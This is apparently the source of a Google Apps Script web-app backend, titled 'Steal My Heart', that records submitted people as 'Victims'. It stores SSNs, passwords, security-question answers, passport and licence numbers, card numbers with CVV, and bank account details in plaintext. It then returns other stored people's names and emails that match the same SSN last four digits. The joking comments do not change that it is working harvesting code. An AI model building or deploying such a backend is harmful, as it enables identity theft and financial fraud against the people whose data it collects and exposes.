// ══════════════════════════════════════════════════════════════
//  Steal My Heart — Google Apps Script Backend
//  Deploy as: Web App → Execute as: Me → Who has access: Anyone
// ══════════════════════════════════════════════════════════════

const SHEET_NAME = 'Victims'; // feel free to rename to "Members" if you want to be boring

function doPost(e) {
  const data = JSON.parse(e.postData.contents);

  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sheet = ss.getSheetByName(SHEET_NAME);

  // Create sheet with headers if it doesn't exist
  if (!sheet) {
    sheet = ss.insertSheet(SHEET_NAME);
    sheet.appendRow([
      'Timestamp', 'Full Name', 'DOB', 'Email', 'Phone', 'Address',
      'SSN (!!!)', 'SSN Last 4', 'DL Number', 'SSN State', 'Passport',
      'Mothers Maiden Name', 'First Pet', 'Childhood Street', 'HS Mascot',
      'Grandmother Name', 'Birth City', 'Passwords (lol)',
      'CC Number', 'CC Expiry', 'CVV', 'Routing Number', 'Account Number'
    ]);
    sheet.getRange(1, 1, 1, 23).setFontWeight('bold').setBackground('#c0392b').setFontColor('white');
  }

  const ssn = String(data.ssn || '').replace(/\D/g, '');
  const last4 = ssn.slice(-4);

  // Append new victim
  sheet.appendRow([
    new Date(),
    data.name || '',
    data.dob || '',
    data.email || '',
    data.phone || '',
    data.address || '',
    data.ssn || '',          // Column G: SSN (plaintext, as nature intended)
    last4,                   // Column H: last 4, for easy VLOOKUP
    data.dlNumber || '',
    data.ssnState || '',
    data.passport || '',
    data.mothersMaidenName || '',
    data.firstPet || '',
    data.childhoodStreet || '',
    data.hsMascot || '',
    data.grandmotherName || '',
    data.birthCity || '',
    data.passwords || '',    // Column R: passwords, plaintext, why not
    data.ccNumber || '',
    data.ccExpiry || '',
    data.ccCvv || '',
    data.routingNumber || '',
    data.accountNumber || '',
  ]);

  // Find matches: same last-4 SSN, different person
  const allRows = sheet.getDataRange().getValues();
  const matches = allRows
    .slice(1) // skip header
    .filter(row => {
      const rowLast4 = String(row[7]); // Column H
      const rowName  = String(row[1]);
      return rowLast4 === last4 && rowName !== data.name;
    })
    .map(row => ({
      name:  row[1],
      email: row[3],
      last4: row[7],
    }));

  return ContentService
    .createTextOutput(JSON.stringify({ success: true, matches }))
    .setMimeType(ContentService.MimeType.JSON);
}

// For testing: GET request returns sheet stats
function doGet(e) {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const sheet = ss.getSheetByName(SHEET_NAME);
  const count = sheet ? Math.max(0, sheet.getLastRow() - 1) : 0;
  return ContentService
    .createTextOutput(JSON.stringify({ status: 'ok', victims: count }))
    .setMimeType(ContentService.MimeType.JSON);
}
